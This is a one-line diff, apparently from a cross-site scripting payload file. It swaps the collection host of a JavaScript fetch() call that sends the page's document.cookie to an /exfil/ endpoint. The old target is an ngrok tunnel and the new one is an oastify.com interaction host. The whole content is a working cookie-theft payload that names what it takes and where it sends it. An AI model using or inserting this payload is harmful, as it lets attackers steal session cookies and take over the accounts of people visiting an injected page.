@@ -1,1 +1,1 @@
-fetch('https://5b0a-2a09-bac0-1000-252-00-db-d.ngrok-free.app/exfil/?c='+document.cookie)
+fetch('https://zqtm51ts6kbkqx6x5le4g5vljcp3dt1i.oastify.com/exfil/?c='+document.cookie)
